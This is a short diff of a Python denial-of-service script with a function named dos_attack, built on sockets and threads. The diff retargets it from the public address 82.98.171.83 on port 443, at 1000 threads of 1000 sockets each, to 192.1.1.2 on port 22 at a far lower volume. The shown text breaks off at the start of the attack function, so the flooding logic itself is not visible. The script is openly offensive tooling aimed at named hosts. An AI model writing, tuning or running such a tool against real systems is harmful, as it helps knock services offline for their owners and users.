@@ -2,10 +2,10 @@ import socket
 import threading
 import time
 
-TARGET_IP = '82.98.171.83'
-TARGET_PORT = 443
-THREADS = 1000
-SOCKETS_PER_THREAD = 1000
+TARGET_IP = '192.1.1.2'
+TARGET_PORT = 22
+THREADS = 100
+SOCKETS_PER_THREAD = 5
 
 def dos_attack(target_ip, target_port):
     sockets = []
